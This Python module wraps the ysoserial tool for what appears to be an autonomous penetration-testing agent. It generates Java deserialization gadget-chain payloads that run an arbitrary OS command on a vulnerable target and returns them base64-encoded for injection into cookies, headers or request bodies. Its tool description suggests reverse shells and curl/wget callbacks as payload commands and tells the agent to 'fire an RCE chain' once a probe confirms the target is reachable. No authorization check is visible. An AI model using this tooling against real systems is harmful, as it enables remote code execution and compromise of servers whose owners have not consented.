"""Generate Java deserialization payloads with ysoserial.

ysoserial builds a serialized Java object (a "gadget chain") that, when
deserialized by a vulnerable application, executes a command. This wrapper runs
`java -jar ysoserial.jar <gadget> '<command>'`, captures the (binary) payload,
and returns it base64-encoded so it can be dropped straight into an HTTP body,
header, cookie, or parameter — or written to a file for delivery with another
tool (http_request, web_exec, nc).

Call with no `gadget` to list the available gadget chains so the right one can
be chosen for the target's classpath (CommonsCollections1-7, Hibernate1,
Spring1, ROME, Jdk7u21, URLDNS for a blind out-of-band probe, …).
"""
from __future__ import annotations

import base64
import os
import shutil
import subprocess
from core import proc as runner
from pathlib import Path

# Where the jar typically lands on Kali / a manual download. YSOSERIAL_JAR wins
# if the operator points it somewhere else.
_JAR_CANDIDATES = [
    "/usr/share/ysoserial/ysoserial.jar",
    "/usr/share/ysoserial/ysoserial-all.jar",
    "/opt/ysoserial/ysoserial.jar",
    "/opt/ysoserial/ysoserial-all.jar",
    "/usr/share/java/ysoserial.jar",
]

OUTPUT_CAP = 200_000  # base64 chars — a gadget payload is small; this is slack


def _resolve_jar() -> str | None:
    env = os.environ.get("YSOSERIAL_JAR", "").strip()
    if env and Path(env).is_file():
        return env
    for cand in _JAR_CANDIDATES:
        if Path(cand).is_file():
            return cand
    return None


def _invocation() -> tuple[list[str], str | None]:
    """Return the base command to run ysoserial, plus an error if it's unavailable.

    Prefers `java -jar <jar>`; falls back to a `ysoserial` wrapper script on PATH.
    """
    jar = _resolve_jar()
    if jar:
        if not shutil.which("java"):
            return [], ("ysoserial.jar found but `java` is not in PATH — install a JRE "
                        "(apt_install default-jre) to run it.")
        return ["java", "-jar", jar], None
    if shutil.which("ysoserial"):
        return ["ysoserial"], None
    return [], (
        "ysoserial not found. Provide the jar via the YSOSERIAL_JAR env var, or place it "
        "at /usr/share/ysoserial/ysoserial.jar. Download: "
        "https://github.com/frohoff/ysoserial/releases (ysoserial-all.jar)."
    )


def ysoserial(
    gadget: str | None = None,
    command: str | None = None,
    encode: str = "base64",
    output_file: str | None = None,
    timeout: int = 60,
) -> dict:
    base, err = _invocation()
    if err:
        return {"error": err}

    # No gadget → list the available chains so the agent can pick the right one.
    if not gadget or not gadget.strip():
        try:
            proc = runner.run(base, capture_output=True, text=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            return {"error": "ysoserial timed out listing gadgets"}
        # ysoserial prints its payload/gadget table to stderr.
        listing = (proc.stderr or proc.stdout or "").strip()
        return {
            "mode": "list_gadgets",
            "gadgets": listing[:OUTPUT_CAP],
            "_command": " ".join(base),
            "note": "Pass gadget + command to generate a payload, e.g. gadget='CommonsCollections5'.",
        }

    if not command or not command.strip():
        return {"error": "command is required when a gadget is given — the OS command the "
                         "payload should execute on deserialization, e.g. 'id' or a reverse shell."}

    enc = (encode or "base64").strip().lower()
    if enc not in ("base64", "raw"):
        return {"error": f"unsupported encode '{encode}' — use 'base64' or 'raw'."}

    cmd = base + [gadget.strip(), command]
    try:
        # Payload is binary — capture bytes, do NOT decode as text.
        proc = runner.run(cmd, capture_output=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return {"error": f"ysoserial timed out after {timeout}s", "_command": _cmd_str(cmd)}
    except FileNotFoundError:
        return {"error": "java/ysoserial vanished from PATH", "_command": _cmd_str(cmd)}

    payload = proc.stdout or b""
    if not payload:
        stderr = (proc.stderr or b"").decode("utf-8", "replace").strip()
        return {
            "error": f"ysoserial produced no payload (gadget '{gadget}' may be unknown or "
                     f"unavailable in this build). stderr: {stderr[:500]}",
            "_command": _cmd_str(cmd),
        }

    result = {
        "gadget": gadget.strip(),
        "command": command,
        "payload_bytes": len(payload),
        "_command": _cmd_str(cmd),
    }

    if output_file:
        try:
            Path(output_file).write_bytes(payload)
            result["output_file"] = output_file
        except OSError as e:
            result["file_error"] = str(e)

    if enc == "base64":
        b64 = base64.b64encode(payload).decode("ascii")
        result["encoding"] = "base64"
        result["payload"] = b64[:OUTPUT_CAP]
        result["truncated"] = len(b64) > OUTPUT_CAP
        result["url_encoded_hint"] = (
            "URL-encode the base64 if placing it in a query/cookie value."
        )
    else:
        # raw → hex preview only (binary can't go in JSON); steer to output_file.
        result["encoding"] = "raw"
        result["hex_preview"] = payload[:64].hex()
        result["note"] = "Raw binary returned only as a preview — use output_file to capture it."

    return result


def _cmd_str(cmd: list) -> str:
    return " ".join(str(c) for c in cmd)


TOOL_DEFINITION = {
    "name": "ysoserial",
    "description": (
        "Generate a Java deserialization exploit payload (gadget chain) with ysoserial. When a "
        "target deserializes attacker-controlled Java objects — an exposed RMI/JMX service, a "
        "Java-serialized cookie/parameter/ViewState, T3/JMS, a `rO0`-prefixed blob — a gadget "
        "chain turns that into command execution. Returns the payload base64-encoded so you can "
        "drop it into an HTTP body/header/cookie/param (decode/url-encode as the sink needs), or "
        "write it to a file with output_file for delivery via http_request, web_exec, or nc. "
        "Call with NO arguments first to LIST the available gadget chains, then pick the one that "
        "matches the target's libraries (CommonsCollections1-7, Hibernate1/2, Spring1/2, ROME, "
        "Jdk7u21, Groovy1, …). Use the URLDNS gadget with a command set to your collaborator "
        "domain for a safe blind out-of-band check that deserialization is reachable before "
        "firing an RCE chain."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "gadget": {
                "type": "string",
                "description": "Gadget chain name, e.g. 'CommonsCollections5' or 'URLDNS'. Omit to list all available chains.",
            },
            "command": {
                "type": "string",
                "description": "OS command the payload runs on deserialization, e.g. 'id', a curl/wget callback, or a reverse shell. For the URLDNS gadget this is the URL to resolve. Required when a gadget is given.",
            },
            "encode": {
                "type": "string",
                "enum": ["base64", "raw"],
                "description": "Output encoding (default base64). 'raw' returns a hex preview only — pair with output_file to capture the binary.",
            },
            "output_file": {
                "type": "string",
                "description": "Optional path to write the raw binary payload to (for delivery with another tool).",
            },
            "timeout": {
                "type": "integer",
                "description": "Execution timeout seconds (default 60).",
            },
        },
    },
}
